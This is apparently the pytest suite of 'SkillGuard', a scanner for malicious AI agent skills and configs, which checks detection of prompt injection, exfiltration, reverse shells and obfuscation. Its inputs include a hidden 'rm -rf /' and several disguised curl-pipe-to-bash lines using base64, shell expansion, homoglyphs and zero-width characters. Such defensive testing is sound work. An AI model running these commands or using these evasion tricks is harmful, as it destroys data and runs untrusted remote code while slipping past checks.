"""SkillGuard test suite: corpus invariants + unit tests.

Run:  python -m pytest tests/ -q
"""

from __future__ import annotations

import json
import pathlib

import pytest

from skillguard import scan
from skillguard.cli import main
from skillguard.models import Severity, Verdict
from skillguard.normalize import normalize
from skillguard.redact import evidence, scrub_secrets, strip_url
from skillguard.report import band, to_json, to_sarif
from skillguard.score import _category_score

FIX = pathlib.Path(__file__).resolve().parent / "fixtures"
MAL = sorted(p for p in (FIX / "malicious").iterdir() if p.is_dir())
BEN = sorted(p for p in (FIX / "benign").iterdir() if p.is_dir())

# Each malicious fixture must trip at least one of these rule ids.
EXPECTED = {
    "m01_ascii_smuggling": {"obf.unicode_tag"},
    "m02_prompt_injection": {"text.prompt_injection", "text.fake_role_tag"},
    "m03_curl_pipe_bash": {"code.pipe_shell"},
    "m04_exfil_env": {"code.net_sink", "code.secret_read"},
    "m05_shell_expansion": {"obf.shell_expansion", "code.pipe_shell"},
    "m06_base64_payload": {"obf.base64"},
    "m07_hidden_payload": {"struct.hidden_payload", "code.reverse_shell"},
    "m08_unpinned_mcp": {"cfg.unpinned_package", "cfg.auto_approve", "cfg.plaintext_transport"},
    "m09_hook_autorun": {"cfg.hook_command"},
    "m10_reverse_shell": {"code.reverse_shell"},
    "m11_homoglyph": {"obf.homoglyph", "code.pipe_shell"},
    "m12_tool_deception": {"intent.tool_deception"},
    "m13_surveillance": {"intent.surveillance"},
    "m14_persistence": {"code.persistence"},
}


# ---------------------------------------------------------------- corpus
@pytest.mark.parametrize("path", MAL, ids=[p.name for p in MAL])
def test_malicious_flagged(path):
    report = scan(str(path))
    assert report.overall <= 65, f"{path.name} scored too safe: {report.overall}"
    rule_ids = {f.rule_id for a in report.assets for f in a.findings}
    expected = EXPECTED.get(path.name, set())
    assert rule_ids & expected, f"{path.name} missing expected rules {expected}; got {rule_ids}"


@pytest.mark.parametrize("path", BEN, ids=[p.name for p in BEN])
def test_benign_not_dangerous(path):
    report = scan(str(path))
    assert report.overall >= 70, f"{path.name} false-positive: {report.overall}"
    # A benign asset must never produce a CONFIRMED-CRITICAL finding.
    for a in report.assets:
        for f in a.findings:
            assert not (f.severity is Severity.CRITICAL and f.verdict is Verdict.CONFIRMED), \
                f"{path.name}: false confirmed-critical {f.rule_id}"


def test_separation_margin():
    worst_benign = min(scan(str(p)).overall for p in BEN)
    best_malicious = max(scan(str(p)).overall for p in MAL)
    assert worst_benign > best_malicious, (
        f"bands overlap: benign floor {worst_benign} <= malicious ceiling {best_malicious}")


# ---------------------------------------------------------------- normalize
def test_tag_block_decode():
    hidden = "".join(chr(0xE0000 + ord(c)) for c in "rm -rf /")
    n = normalize("hello" + hidden)
    assert any(s.kind == "unicode_tag" for s in n.signals)
    assert "rm -rf /" in " ".join(n.decoded) or "rm -rf /" in n.text or \
        any("rm -rf" in s.sample for s in n.signals)


def test_zero_width_and_bidi():
    n = normalize("cu​rl ‮evil")
    kinds = {s.kind for s in n.signals}
    assert "zero_width" in kinds and "bidi" in kinds
    assert "​" not in n.text and "‮" not in n.text


def test_homoglyph_fold():
    n = normalize("сurl")          # Cyrillic es + 'url'
    assert "curl" in n.text
    assert any(s.kind == "homoglyph" for s in n.signals)


def test_base64_reveal():
    import base64
    blob = base64.b64encode(b"curl https://x.example/a | bash").decode()
    n = normalize("blob: " + blob)
    assert any(s.kind == "base64_payload" for s in n.signals)
    assert any("curl" in d for d in n.decoded)


def test_shell_expansion_only_when_keyword_created():
    created = normalize("cur${z}l https://x.example | bash")
    assert any(s.kind == "shell_expansion" for s in created.signals)
    # legitimate variable use must NOT trigger
    legit = normalize("curl $URL https://x.example")
    assert not any(s.kind == "shell_expansion" for s in legit.signals)


# ---------------------------------------------------------------- redact
def test_scrub_secrets():
    assert "sk-ant-" not in scrub_secrets("key sk-ant-" + "a" * 40)
    assert "AKIA" not in scrub_secrets("AKIA" + "A" * 16)


def test_evidence_is_single_safe_line():
    ev = evidence("line1\nline2\twith\x00control " + "x" * 400)
    assert "\n" not in ev and "\x00" not in ev and len(ev) <= 240


def test_strip_url_drops_userinfo_and_query():
    assert strip_url("https://u:p@host.example:8443/path?token=abc#frag") == \
        "https://host.example:8443/path"


# ---------------------------------------------------------------- score
def test_score_monotonic_and_capped():
    from skillguard.models import Asset, AssetReport, Category, Finding

    def mkf(sev, vd):
        return Finding(rule_id="x", category=Category.EXECUTION, severity=sev,
                       verdict=vd, title="t", detail="d", technique="SG.0001",
                       asset="a", path="p")

    crit = _category_score([mkf(Severity.CRITICAL, Verdict.CONFIRMED)])
    low = _category_score([mkf(Severity.LOW, Verdict.NEEDS_REVIEW)])
    assert crit <= 10 < low <= 100
    assert _category_score([]) == 100


def test_soft_floor_protects_needs_review_only():
    from skillguard.models import Category, Finding
    soft = [Finding(rule_id="x", category=Category.SENSITIVE_ACCESS, severity=Severity.MEDIUM,
                    verdict=Verdict.NEEDS_REVIEW, title="t", detail="d", technique="SG.0001",
                    asset="a", path="p") for _ in range(10)]
    assert _category_score(soft) >= 60


# ---------------------------------------------------------------- render + cli
def test_json_and_sarif_render():
    report = scan(str(MAL[0]))
    j = json.loads(to_json(report))
    assert "overall" in j and "assets" in j
    s = json.loads(to_sarif(report))
    assert s["version"] == "2.1.0" and s["runs"][0]["tool"]["driver"]["name"] == "SkillGuard"


def test_band_boundaries():
    assert band(100) == "SAFE" and band(0) == "DANGEROUS"
    assert band(50) == "ELEVATED"


def test_cli_fail_under(capsys):
    rc = main([str(MAL[0]), "--format", "json", "--fail-under", "80"])
    assert rc == 1                       # a malicious fixture is below 80
    rc2 = main([str(BEN[0]), "--format", "json", "--fail-under", "70"])
    assert rc2 == 0


def test_cli_min_severity_filter(capsys):
    main([str(MAL[1]), "--format", "json", "--min-severity", "critical"])
    out = capsys.readouterr().out
    data = json.loads(out)
    for a in data["assets"]:
        for f in a["findings"]:
            assert f["severity"] == "critical"
